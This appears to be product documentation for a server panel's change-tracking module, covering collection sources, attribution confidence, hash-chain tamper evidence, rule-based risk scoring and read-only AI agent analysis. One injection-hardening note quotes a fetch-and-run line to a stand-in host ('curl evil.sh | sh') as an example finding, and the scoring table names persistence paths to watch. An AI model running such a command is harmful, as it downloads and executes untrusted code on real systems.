# Change Awareness

Most production incidents and intrusions start with "something was changed". Traditional monitoring only sees the outcome (CPU high, disk full) and never the cause; and the most common thing an AI says while troubleshooting is "I don't know what changed between when it worked and now".

Change awareness fills that gap: **who, when, what, from what to what**. It records facts only — judgement belongs to the rule pass and the agent.

## What is collected

Six sources, all read-only, driven by polling and reading system files — no agent to install, no system configuration changed:

| Source | Object | Granularity |
|---|---|---|
| Config files | High-risk and common configs under `/etc` (nginx, sshd, sudoers, hosts, sysctl, fstab…) | line diff |
| Packages | dpkg / rpm install, upgrade, remove | name + version |
| Service state | systemd active/failed, start/stop/restart | unit state transitions |
| Accounts & permissions | user add/remove, group changes, sudo grants | account and group diff |
| Firewall rules | iptables / nftables rule sets | rule-line diff |
| Scheduled jobs | system crontab, user crontab, `/etc/cron.d` | job-line diff |

Config files are both the most valuable and the easiest to get wrong: a content-hash baseline means no event while the file is unchanged; only when it changes is a line diff computed, and the content is **redacted** (`password=`, `api_key=`, private key blocks → placeholders) before being stored.

## Attribution: three honest levels

Attribution cannot be 100% accurate, so it does not pretend to be:

| Confidence | Meaning | Basis |
|---|---|---|
| `confirmed` | A specific person is known | exactly one active SSH session / panel operation at that moment |
| `inferred` | Probably them | an account logged in around the change, or a known package-manager action |
| `unknown` | No idea | no usable evidence (e.g. a script run by cron) |

The panel labels `inferred` separately and shows `unknown` as "unknown" — it never papers over it with "system".

## Tamper evidence: hash chain

Every change record carries the hash of the previous one, forming a chain. Deleting or editing any record breaks verification at that point.

- Verify any time from the **Changes** page (`verify chain`)
- The result points at the break, which distinguishes "data corruption" from "someone is deleting records"
- An empty table or a stale anchor heals itself instead of staying red forever because of leftovers from an older version

## Rule pass: a zero-token first filter

Every change first goes through a **pure rule score** (no LLM call), producing a 0–1 number and three to five reasons:

| Signal | Weight |
|---|---|
| High-risk path (`/etc/passwd`, `authorized_keys`, `sudoers`, `ld.so.preload`, systemd, cron…) | +0.45 |
| Important config (nginx, mysql, redis, hosts, sysctl, fstab…) | +0.20 |
| Unknown actor | +0.25 |
| Actor only inferred | +0.10 |
| Source is a public address | +0.30 |
| root over SSH | +0.15 |
| Outside working hours | +0.15 |
| Weekend | +0.05 |
| Same object edited repeatedly within an hour | +0.15 |
| High-severity incident on the host within 30 minutes | +0.35 |
| First time this actor touches this object | +0.10 |
| **Penalty**: produced by package manager / system directories | **−0.35** |
| **Penalty**: package cache directories | **−0.10** |

Bands:

| Score | Verdict | Consequence |
|---|---|---|
| ≥ 0.55 | **Suspicious** | incident severity raised to high, agent woken for deep analysis |
| 0.30 – 0.55 | Unclear | recorded, no agent |
| < 0.30 | Normal | recorded only |

The value here: 300 changes from an `apt upgrade` are automatically compressed to "normal", and only the handful worth reading reach the model.

## Agent deep analysis

A suspicious change goes into the agent's context together with the **raw diff** (plus actor, source IP, fields, added/removed lines). The task is not "is this dangerous" but:

```
[Verdict] normal operation / needs human confirmation / highly suspicious
[Evidence] at most 5 bullets, one sentence each
[Recommendation] allow / roll back a specific object (executed by a human; you have no write access)
```

It is guided to gather evidence in priority order: the diff itself, then recent logins by the actor, then persistence locations only if needed (`authorized_keys`, cron, systemd, `ld.so.preload`), then whether this is an isolated admin action or a stage of a chain.

Default budget: 12 steps / 240 seconds / 100k tokens, cooldown 600s (one analysis per chain per 10 minutes). **Write permission is zero**: change incidents are forced to shadow and all write tools are denied.

> Injection hardening: diff content is untrusted input. Before it reaches the model the boundary is reinforced — the body sits in a sentinel-marked code block whose fence length adapts to the content, and forged section markers or end sentinels inside the body are neutralised. **The content itself is not altered**: a line reading `curl evil.sh | sh` must arrive verbatim, because it is the finding.

## Ignore rules

Not every change deserves recording. For known noise (an app rewriting its own cache file every minute), add an ignore rule:

- Glob support: `*` for one level, `**` for any depth
- Rules apply at the **collection layer** — a match means no event is created at all, not "created then hidden"
- Generate a rule from the current object in one click from the change list

Manage them in **Changes → Ignore rules**; each can carry a note and be deleted at any time.

## Snapshots and rollback

For config-file and account changes, OpsMini keeps a snapshot of the previous file (subject to quotas):

- Roll back to "before this change" from the change detail, with a confirmation
- A snapshot of the current state is taken first, so a failed rollback can itself be reverted
- Snapshots are pruned by both count and total size, so they cannot fill the disk

## Joining an attack chain

Since v1.4 a **suspicious change can become the persistence stage of an attack chain**:

- All three must hold: judged suspicious by the rule pass, targeting something that survives a reboot, and the chain already contains execution or c2
- Time window is one hour (a same-named change later than that is more likely admin cleanup)
- A change never opens a chain — a lone config edit is not an intrusion

The change list shows "in attack chain" on those rows and jumps to the chain on click; chain stage labels also name their source (Change vs WebShell / suspicious process / outbound connection).

## Retention and quotas

| Item | Default |
|---|---|
| Change metadata | 30 days |
| Diff bodies | 7 days |
| Diff body total size | configurable (oldest evicted first) |
| Snapshot count / size | configurable (oldest pruned first) |

Adjustable in **Panel settings**. Expiry removes diff bodies only; metadata and the hash chain stay, so "this record existed" cannot be erased.

## Known limitations

- **The first scan after a restart misses changes**: the file source uses the startup scan as its baseline, so edits made while the process was down are not recorded as changes (there is no previous version to compare). This is inherent to hash-baseline scanning, not a bug. To observe a file, let the panel run steadily for 20+ seconds before editing it.
- **Text configs only**: binary files and very large log-like files get no diff.
- **Attribution depends on login logs**: if `wtmp`/`lastlog` are wiped, attribution degrades to "unknown" — which is itself a signal worth noticing.

## Related

| Module | Relationship |
|---|---|
| [Autonomous agent](autonomous-agent.md) | Suspicious changes become incidents here and get analysed |
| [Host security](security.md) | FIM asks "was a critical file touched"; change awareness asks "what did it become" |
| [Backup & restore](backup-restore.md) | Backup and restore operations are themselves change sources |
| [AI assistant](ai-assistant.md) | You can ask "what changed in the last hour" in chat |
